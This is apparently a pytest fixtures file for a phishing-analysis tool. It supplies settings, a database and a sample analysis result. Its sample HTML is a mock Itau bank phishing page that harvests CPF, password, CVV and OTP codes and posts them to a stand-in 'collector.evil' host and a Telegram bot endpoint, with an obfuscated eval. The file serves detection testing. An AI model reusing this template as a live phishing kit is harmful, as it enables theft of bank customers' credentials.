"""Shared pytest fixtures and path bootstrap.

Ensures the repository root (the parent of the ``phishing_intel`` package) is on
``sys.path`` so ``import phishing_intel`` resolves when pytest's rootdir is the
package directory. Also provides reusable fixtures: sample HTML/JS, a validated
``Settings`` object, an in-memory database and a fully-populated
``AnalysisResult``.
"""

from __future__ import annotations

import os
import sys

# --- Path bootstrap ---------------------------------------------------------
# Insert the repo root (two levels up from this file) so the package imports.
_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if _REPO_ROOT not in sys.path:
    sys.path.insert(0, _REPO_ROOT)

import pytest  # noqa: E402

from phishing_intel.config.settings import Settings  # noqa: E402
from phishing_intel.database.session import Database  # noqa: E402
from phishing_intel.models.campaign import AttributionScore  # noqa: E402
from phishing_intel.models.findings import (  # noqa: E402
    AnalysisResult,
    BrandDetection,
    ConfidenceLevel,
    ExfiltrationAnalysis,
    ExfiltrationChannel,
    ExfiltrationDestination,
    KitFingerprint,
    PhishingClassification,
    PhishingType,
)
from phishing_intel.models.infrastructure import (  # noqa: E402
    CertificateInfo,
    InfrastructureInfo,
)


PHISHING_HTML = """<!DOCTYPE html>
<html lang="pt-br">
<head>
  <title>Itau - Central de Seguranca</title>
  <meta name="application-name" content="Itau">
  <meta property="og:site_name" content="Banco Itau">
</head>
<body>
  <!-- kit build v3.2 -->
  <img src="/assets/img/itau-logo.png" alt="logo">
  <form id="loginForm" class="auth-box secure" action="https://collector.evil/next.php" method="post">
    <label for="cpf">CPF</label>
    <input id="cpf" name="cpf" type="text" placeholder="Digite seu CPF">
    <label for="senha">Senha</label>
    <input id="senha" name="senha" type="password" placeholder="Sua senha">
    <input id="cvv" name="cvv" type="text" placeholder="CVV do cartao">
    <input id="token" name="otp_token" type="text" placeholder="Codigo OTP (SMS)">
    <input type="hidden" name="csrf" value="abc123">
    <button type="submit">Entrar</button>
  </form>
  <a href="https://external-cdn.example/help">Ajuda</a>
  <script src="/js/app.min.js"></script>
  <script src="https://external-cdn.example/jquery.js"></script>
  <script>
    document.getElementById('loginForm').addEventListener('submit', function(){
      var senha = document.getElementById('senha').value;
      fetch("https://api.telegram.org/bot123456:AAABBB/sendMessage", {method:"POST"});
      var token = "supersecrettoken123456";
      $.ajax({url: "https://collector.evil/save.php", method: "POST"});
      eval(atob("Y29uc29sZS5sb2c="));
    });
  </script>
</body>
</html>
"""

BENIGN_HTML = """<html><head><title>Blog</title></head>
<body><p>Just an article about cats.</p><a href="/next">next</a></body></html>"""


@pytest.fixture()
def phishing_html() -> str:
    """A realistic phishing page HTML (Itau credential/OTP/card harvesting)."""

    return PHISHING_HTML


@pytest.fixture()
def benign_html() -> str:
    """A benign page with no forms/brands (negative case)."""

    return BENIGN_HTML


@pytest.fixture()
def settings() -> Settings:
    """Default settings with network + MISP disabled for offline tests."""

    cfg = Settings()
    cfg.app.allow_network = False
    cfg.app.evidence_dir = "./_test_evidence"
    cfg.misp.enabled = False
    return cfg


@pytest.fixture()
def memory_db() -> Database:
    """A fresh in-memory SQLite database per test."""

    return Database("sqlite:///:memory:")


@pytest.fixture()
def sample_result() -> AnalysisResult:
    """A fully-populated AnalysisResult used across enrichment/db tests."""

    return AnalysisResult(
        url="https://itau-secure.example/login",
        domain="itau-secure.example",
        html_hash="a" * 64,
        javascript_hash="b" * 64,
        classification=PhishingClassification(
            primary_type=PhishingType.CREDENTIAL_HARVESTING,
            detected_types={PhishingType.CREDENTIAL_HARVESTING: 90},
            confidence=90,
        ),
        brand=BrandDetection(
            target_brand="itau", category="financial_institution", confidence=80
        ),
        fingerprint=KitFingerprint(
            dom_hash="d" * 64,
            asset_hash="e" * 64,
            script_hash="f" * 64,
            campaign_fingerprint="c" * 64,
        ),
        certificate=CertificateInfo(
            serial_number="0a1b2c3d",
            issuer="CN=Evil CA",
            subject="CN=itau-secure.example",
            sha256_fingerprint="9" * 64,
            sha1_fingerprint="8" * 40,
        ),
        infrastructure=InfrastructureInfo(
            ip="203.0.113.10",
            asn="AS64500",
            hosting_provider="EvilHost LLC",
            country="RU",
        ),
        exfiltration=ExfiltrationAnalysis(
            destinations=[
                ExfiltrationDestination(
                    destination="https://collector.evil/next.php",
                    channel=ExfiltrationChannel.HTTP,
                    confidence=75,
                )
            ],
            confidence=75,
        ),
        iocs=["https://itau-secure.example/login", "itau-secure.example"],
    )


@pytest.fixture()
def high_attribution() -> AttributionScore:
    """A high-confidence attribution score fixture."""

    return AttributionScore(
        score=85,
        confidence=ConfidenceLevel.HIGH,
        matched_campaign_id="CAMP-itau-cccccccccccc",
    )
